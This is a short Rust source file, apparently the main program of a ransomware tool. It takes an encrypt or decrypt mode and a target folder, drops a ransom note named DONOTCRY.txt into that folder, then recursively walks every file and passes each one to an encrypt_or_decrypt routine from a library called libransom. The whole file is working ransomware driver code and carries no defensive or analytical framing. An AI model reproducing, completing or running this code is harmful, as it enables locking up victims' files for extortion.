use libransom::encrypt_or_decrypt;
use std::{env, fs};
use walkdir::WalkDir;

fn main() {
    let args: Vec<_> = env::args().collect();

    if args.len() != 3 {
        println!(
            "Not enough arguments!\nUsage: {} <encrypt|decrypt> <folder>",
            args[0].clone()
        );
        return;
    }

    // Create DONOTCRY.txt file
    let readme_msg = include_str!("../res/DONOTCRY.txt");
    let readme_path = if fs::metadata(args[2].clone()).unwrap().is_file() {
        String::from("DONOTCRY.txt")
    } else {
        format!("{}/DONOTCRY.txt", args[2].clone())
    };

    fs::write(readme_path, readme_msg).unwrap();

    // Check if the input is a file or a directory
    if fs::metadata(args[2].clone()).unwrap().is_dir() {
        // let entries = fs::read_dir(args[2].clone()).unwrap();

        // Iterate over files and directories inside a directory and encrypt or decrypt them
        for entry in WalkDir::new(args[2].clone()).into_iter().filter_map(|e| e.ok()) {

            if entry.file_type().is_file() {
                encrypt_or_decrypt(entry.path().to_str().unwrap(), args[1].clone().as_str());
            }
        }
    } else {
        encrypt_or_decrypt(args[2].clone().as_str(), args[1].clone().as_str());
    }
}
